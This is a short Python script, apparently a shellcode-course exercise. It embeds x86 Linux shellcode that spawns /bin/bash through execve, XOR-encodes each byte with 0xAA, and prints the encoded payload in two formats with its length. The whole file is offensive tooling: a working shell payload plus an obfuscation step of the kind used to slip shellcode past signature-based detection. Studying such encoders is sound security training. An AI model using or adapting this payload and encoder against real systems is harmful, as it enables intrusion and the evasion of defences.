#!/usr/bin/python3

# Python XOR Encoder

shellcode = b'\xeb\x1a\x5e\x31\xdb\x88\x5e\x09\x89\x76\x0a\x89\x5e\x0e\x8d\x1e\x8d\x4e\x0a\x8d\x56\x0e\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43'

encoded = ""
encoded2 = ""

print('Encoded shellcode....')

for x in bytearray(shellcode):
    y = x^0xAA
    encoded += '\\x'
    encoded += '%02x' % y

    encoded2 += '0x'
    encoded2 += '%02x,' % y

print(encoded)
print("--------------------------------------")
print(encoded2)


print('Len: %d' % len(bytearray(shellcode)))
